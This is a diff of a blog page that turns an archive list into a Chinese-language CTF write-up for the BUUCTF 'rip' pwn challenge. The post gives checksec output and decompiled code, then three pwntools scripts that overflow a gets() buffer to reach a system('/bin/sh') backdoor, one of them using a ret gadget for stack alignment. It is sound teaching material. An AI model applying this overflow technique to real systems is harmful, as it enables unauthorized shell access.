@@ -154,103 +154,164 @@
 </script>
             <div class="main">
                 <div class="container">
-                    <div class="post-wrap archive">
-                        
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                [BUUCTF]rip
+                            </h1>
                             
-                                <h3>
-                                    2021
-                                </h3>
+                                <!--en-->
+                                <div class="post-meta en">
+                                    Author:
+                                    <a itemprop="author" rel="author" href="/">
+                                        「配枪朱丽叶 - 分部。」
+                                    </a>
+                                    <span class="post-time">
+                                Date: <a href="#">2021-07-01</a>
+                            </span>
+                                    <span class="post-readtime">Reading Time:<a
+                                    href="#">1.4
+                                    mins</a></span>
+                                    <span class="post-words">words:<a href="#">279</a></span>
+                                    
+                                        <span class="post-category">
+                                Category:
+                                
+                                <a href="https://shawr00t.github.io/HdcmhNKsB/">pwn</a>
+                                
+                            </span>
+                                        
+                                </div>
+                                
+                        </header>
+                        
+                        <div class="post-content">
+                            <p>checksec：</p>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+</code></pre>
+<p>main函数：</p>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [rsp+1h] [rbp-Fh]
+
+  puts(&quot;please input&quot;);
+  gets(&amp;s, argv);
+  puts(&amp;s);
+  puts(&quot;ok,bye!!!&quot;);
+  return 0;
+}
+</code></pre>
+<p><code>s</code>的rbp为0xf，返回地址为0x8，然后看下back♂door函数：</p>
+<pre><code class="language-c">int fun()
+{
+  return system(&quot;/bin/sh&quot;);
+}
+</code></pre>
+<p>栈溢出，back♂door的地址为0x401197，exp我写成如下的形式：</p>
+<pre><code class="language-python">from pwn import *
+
+io = remote('node3.buuoj.cn',27563)
+payload = 'a'*0xf+'a'*0x08+p64(0x401186)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<p>出乎意料的报错了，查了下资料：</p>
+<blockquote>
+<p>buuctf 最新使用的 ubuntu 18.04 要求 system 函数调用时栈指针必须 16 对齐。</p>
+</blockquote>
+<p>需要ret到 ret 这个指令本身的地址，再ret一遍到后门，修改后的exp如下：</p>
+<pre><code class="language-python">from pwn import *
+
+io = remote('node3.buuoj.cn',27563)
+payload = 'a'*0xf+'a'*0x08+p64(0x401142)+p64(0x401186)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<p>也可以ret到后门函数顶上的 <code>mov rdp rsp</code>（把rsp这个栈指针（Stack Pointer）的值复制到rbp里，rsp始终会指向栈顶）那里：<br>
+<img src="https://imgpp.com/images/2021/07/01/2021-07-01_225434.png" alt="2021-07-01_225434.png" loading="lazy"></p>
+<pre><code class="language-python">from pwn import *
+
+io = remote('node3.buuoj.cn',27563)
+payload = 'a'*0xf+'a'*0x08+p64(0x401187)+p64(0x401186)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+
+                        </div>
+                        
                                 
                                     
+                                        <!--en-->
+                                        <section class="post-copyright en">
+                                            <p class="copyright-item">
+                                                <span>Author:</span>
+                                                <span>「配枪朱丽叶 - 分部。」</span>
+                                            </p>
 
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://shawr00t.github.io/buuctfrip/">
-                                                [BUUCTF]rip
-                                            </a>
-                                            <span class="archive-item-date">2021-07-01 </span>
-                                        </article>
-                                        
-                                            
-                                    
+                                            <p class="copyright-item">
+                                                <span>Permalink:</span>
+                                                <span><a href="https://shawr00t.github.io/buuctfrip/">https://shawr00t.github.io/buuctfrip/</a></span>
+                                            </p>
 
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://shawr00t.github.io/ctfhubret2text/">
-                                                [CTFhub]ret2text
-                                            </a>
-                                            <span class="archive-item-date">2021-07-01 </span>
-                                        </article>
+                                            <p class="copyright-item">
+                                                <span>License:</span>
+                                                <span>MIT License</span>
+                                            </p>
+                                        </section>
                                         
-                                            
-                                    
-
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://shawr00t.github.io/pwnablekrcollision/">
-                                                [pwnable.kr]collision
-                                            </a>
-                                            <span class="archive-item-date">2021-06-29 </span>
-                                        </article>
-                                        
-                                            
-                                    
-
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://shawr00t.github.io/pwnablekrfd/">
-                                                [pwnable.kr]fd
-                                            </a>
-                                            <span class="archive-item-date">2021-06-28 </span>
-                                        </article>
-                                        
-                                            
-                                    
-
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://shawr00t.github.io/bugkuoverflowpwn/">
-                                                [BugKu]overflowPWN
-                                            </a>
-                                            <span class="archive-item-date">2021-06-28 </span>
-                                        </article>
-                                        
-                                            
-                                    
-
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://shawr00t.github.io/gong-fang-shi-jie-pwn-level0/">
-                                                [攻防世界]PWN-level0
-                                            </a>
-                                            <span class="archive-item-date">2021-06-28 </span>
-                                        </article>
-                                        
-                                            
-                                    
-
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://shawr00t.github.io/gong-fang-shi-jie-hello_pwn/">
-                                                [攻防世界]hello_pwn
-                                            </a>
-                                            <span class="archive-item-date">2021-06-26 </span>
-                                        </article>
-                                        
-                                            
-                                    
-
-                                        <article class="archive-item">
-                                            <a class="archive-item-link" href="https://shawr00t.github.io/pwn-huan-jing-da-jian/">
-                                                PWN环境搭建
-                                            </a>
-                                            <span class="archive-item-date">2021-06-25 </span>
-                                        </article>
-                                        
-                                            
                                                 
-                    </div>
-                    <div class="pagination-container">
-                        
-                                                
+                                                    
+                                                        <!-- Share-->
+                                                        <span style="margin-right:15px">
+                                                    <i class="post-share"></i>
+                                                    <span>Share:</span>
+                                                        <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://shawr00t.github.io/buuctfrip/"><i class="fa fa-qrcode"></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://shawr00t.github.io/buuctfrip/&sharesource=qzone&title=[BUUCTF]rip&pics=https://shawr00t.github.io/images/avatar.png?v=1625151481477&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://shawr00t.github.io/buuctfrip/&sharesource=weibo&title=[BUUCTF]rip + " - " + &pic="https://shawr00t.github.io/images/avatar.png?v=1625151481477 "><i class="fa fa-weibo "></i></a>
                                                         
+                                                                </span>
+                                                                <!--en-->
+                                                                <section class="post-tags en ">
+                                                                    <div>
+                                                                        <span>Tag(s):</span>
+                                                                        <span class="tag ">
+                        
+                        
+                        <a href="https://shawr00t.github.io/HdcmhNKsB/">#
+                                                pwn
+                                                    </a>
+                                                    
+                                                        
+                                                            </span>
+                                                                    </div>
+                                                                    <div>
+                                                                        <a href="javascript:window.history.back();">back</a>
+                                                                        <span>&dot;</span>
+                                                                        <a href="#">home</a>
+                                                                    </div>
+                                                                </section>
                                                                 
-                    </div>
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://shawr00t.github.io/ctfhubret2text/">
+                                                                                                    [CTFhub]ret2text
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
                 </div>
+                
+                                            
             </div>
+    </div>
+    </div>
     </div>
     
         <footer id="footer" class="footer">
@@ -306,5 +367,8 @@
                 
         </div>
 </body>
+<script>
+    scroll();
+</script>
 
 </html>
